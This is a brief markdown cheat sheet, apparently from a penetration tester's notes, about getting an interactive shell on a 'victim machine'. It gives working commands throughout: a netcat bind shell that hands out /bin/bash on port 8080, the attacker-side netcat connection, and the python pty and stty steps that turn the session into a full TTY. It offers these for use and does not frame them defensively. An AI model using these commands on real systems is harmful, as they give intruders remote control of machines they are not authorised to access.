## Get shell with TTY

* on victim machine
```bash
nc -l -p 8080 -e /bin/bash
```
* on local machine
```bash
nc VICTIM_MACHINE_IP 8080 -v
```
* test the connection with a command
```bash
id
```
* let's now spawn a better shell with python; and improve it with TTY

```bash
## Inside NC shell
$ python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z Send now the netcat connection to background

## In Kali
$ echo $TERM
# To get get xterm-256color (we need it later)
$ stty -a
# To Get TTY configuration (we need columns and rows - speed 38400 baud; rows 69; columns 266; line = 0;)
$ stty raw -echo
$ fg
$ <ENTER>
# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>

```
